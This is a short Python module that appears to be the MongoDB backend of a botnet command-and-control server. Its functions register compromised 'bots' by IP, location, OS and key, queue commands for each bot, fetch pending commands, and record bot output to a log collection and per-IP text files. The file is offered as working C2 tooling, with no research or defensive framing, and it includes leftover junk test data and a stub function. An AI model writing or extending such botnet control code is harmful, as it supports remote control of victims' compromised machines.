from pymongo import MongoClient

global client,BOTS,CMD,LOG 
client = MongoClient('mongodb://localhost:27017')  

# print('[*] Database not found')
# print('[*] Creating new database : Botnet')
botnet = client['Botnet']
BOTS = botnet.bots
CMD = botnet.cmd
LOG = botnet.log
tmp = botnet.tmp
a = [{'tmp' : 'tmp data','dwqdw':'ewfwf'}]
tmp.insert(a)
# print('[*] Database Created')

def add_bot(ip,location,os,key):
    if BOTS.find_one({'ip':ip}) == None :
        BOTS.insert([{'ip':ip,
                    'location':location,
                    'OS':os,
                    'key':key}])
        print('[*] New Bot added')
    else:
        print('[*]Bot in databasse')
        return

def get_info(ip):
    return BOTS.find_one({'ip':ip})

def delete_bot(ip,key):
    pass

def check_cmd(ip):
    x = CMD.find_one({'ip':ip})
    if x is None:
        return -1
    else:
        return x['cmd']

def find_all_bots():
    bots = BOTS.find({})
    ip = []
    for bot in bots:
        ip.append(bot['ip'])
    return ip

def delete_cmd(cmd,ip):
    try:
        CMD.delete_one({'ip':ip,'cmd':cmd})
    except Exception as e:
        print(e)

def make_output_log(cmd,ip,output):
    LOG.insert([{'ip':ip,
                'cmd':cmd,
                'output':output}])
    write_log('>' + output,ip)

def issue_cmd(cmd,ip):
    CMD.insert([{'ip':ip,
                'cmd':cmd,
                'status':0
                }])
    print('[*] Command Queued')

def write_log(msg,ip):
    file = open('data/{}.txt'.format(str(ip)),'a')
    file.write(msg + '\n')
    file.close()
    print('[*] Logs written')
